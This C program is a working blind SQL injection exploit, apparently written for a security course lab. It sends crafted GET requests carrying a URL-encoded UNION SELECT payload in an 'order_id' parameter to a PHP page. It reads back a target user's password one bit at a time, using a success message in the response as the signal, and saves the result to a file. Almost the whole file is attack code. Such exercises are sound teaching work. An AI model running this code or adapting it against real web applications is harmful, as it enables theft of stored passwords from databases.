#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define SERVER "192.168.1.202" // Target web server IP
#define PORT 80                // Web application port
#define SERVER_HOST "192.168.1.202:80"
#define MAX_PASSWORD_LENGTH 15
#define MAX_QUERIES 100
#define STUDENT_ID "336224076"
#define BASE_URL "/index.php?order_id=4%%20UNION%%20SELECT%%20((ASCII(SUBSTRING(password,%%20%d,%%201))%%20%%3E%%3E%%20%d)%%20%%26%%201)%%20FROM%%20users%%20WHERE%%20id%%20=%%20%s--"
// Corrected GET request format with proper headers

// Function to send HTTP GET request and check response
int send_request(int position, int bit) {
    int sock;
    struct sockaddr_in server_addr;
    char request[1024], full_request[2048], response[4096];
    ssize_t bytes_received;

    // Format GET request
    snprintf(request, sizeof(request), BASE_URL,position, bit,STUDENT_ID);
    snprintf(full_request, sizeof(full_request),
        "GET %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "Connection: close \r\n\r\n",
        request, SERVER_HOST);

    // Create socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return -1;
    }

    // Configure the web server address
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PORT);
    inet_pton(AF_INET, SERVER, &server_addr.sin_addr);

    // Connect to the web server
    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Connection failed");
        close(sock);
        return -1;
    }

    // Send HTTP GET request
    send(sock, full_request, strlen(full_request), 0);

    // Receive response
    bytes_received = recv(sock, response, sizeof(response) - 1, 0);
    if (bytes_received < 0) {
        perror("Receiving response failed");
        close(sock);
        return -1;
    }

    response[bytes_received] = '\0'; // Null-terminate response

    return strstr(response, "Your order has been sent!") != NULL;
}

// Function to extract one character bit by bit
char find_character(int position, int *query_count) {
    int bit, ascii_value = 0;

    for (bit = 0; bit < 8; bit++) {
        if (*query_count >= MAX_QUERIES) {
            return '\0';
        }

        (*query_count)++;
        int bit_value = send_request(position, bit);

        if (bit_value) {
            ascii_value |= (1 << bit); // Set the corresponding bit
        }
    }

    return (char)ascii_value;
}

// Function to extract the full password bit by bit
void extract_password() {
    char password[MAX_PASSWORD_LENGTH + 1] = {0};
    int i, query_count = 0;


    for (i = 1; i <= MAX_PASSWORD_LENGTH; i++) {
        if (query_count >= MAX_QUERIES) break;

        password[i - 1] = find_character(i, &query_count);

        if (password[i - 1] == '\0') break;
    }


    // Save password to file
    char filename[20];
    snprintf(filename, sizeof(filename), "%s.txt", STUDENT_ID);

    FILE *fp = fopen(filename, "w");
    if (fp) {
        fprintf(fp, "*%s*", password);
        fclose(fp);
    } else {
        perror("Error saving password file");
    }
}

int main() {
    extract_password();
    return 0;
}

